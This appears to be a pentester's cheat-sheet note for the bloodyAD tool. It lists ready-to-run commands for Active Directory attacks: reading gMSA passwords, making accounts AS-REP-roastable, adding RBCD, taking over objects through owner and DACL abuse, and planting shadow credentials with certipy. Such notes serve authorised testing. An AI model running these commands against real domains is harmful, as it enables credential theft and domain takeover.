---
tags:
  - tool
---
# bloodyAD

AD privilege escalation swiss army knife - https://github.com/CravateRouge/bloodyAD

User Guide - https://github.com/CravateRouge/bloodyAD/wiki/User-Guide

## Capabilities

```powershell
# Get writable objects
bloodyAD --host $TARGET -d $DOMAIN -u $USER -p '$PASSWD' get writable

# Get all AD objects
bloodyAD --host $TARGET -d $DOMAIN -u $USER -p '$PASSWD' get children

# Query users
bloodyAD --host $TARGET -d $DOMAIN -u $USER -p '$PASSWD' get search --filter objectClass=User --attr sAMAccountName | grep sAMAccountName | awk '{print $2}'

# Dump readable DNS records
bloodyAD --host $TARGET -d $DOMAIN -u $USER -p '$PASSWD' get dnsDump

# Read GMSA password
bloodyAD --host $TARGET -d $DOMAIN -u $USER -p '$PASSWD' get object '$GMSA_ACCOUNT' --attr msDS-ManagedPassword

# Set DONT_REQ_PREAUTH in UAC to harvest account hash
bloodyAD --host $TARGET -d $DOMAIN -u $USER -p '$PASSWD' add uac $OBJECT -f DONT_REQ_PREAUTH

# Remove ACCOUNTDISABLE in UAC to enable an account
bloodyAD --host $TARGET -d $DOMAIN -u $USER -p '$PASSWD' remove uac $OBJECT -f ACCOUNTDISABLE

# Add RBCD
bloodyAD --host $TARGET -d $DOMAIN -u $USER -p '$PASSWD' add rbcd $OBJECT $SERVICE_ACC

# Abuse write owner
bloodyAD --host $TARGET -d $DOMAIN -u $USER -p $PASSWD set owner $OBJECT $OUR_USER
bloodyAD --host $TARGET -d $DOMAIN -u $USER -p $PASSWD add genericAll $OBJECT $OUR_USER # Abuse Write DACL
certipy shadow auto -u $USER@$DOMAIN -p '$PASSWD' -target $TARGET -account $OBJECT
```
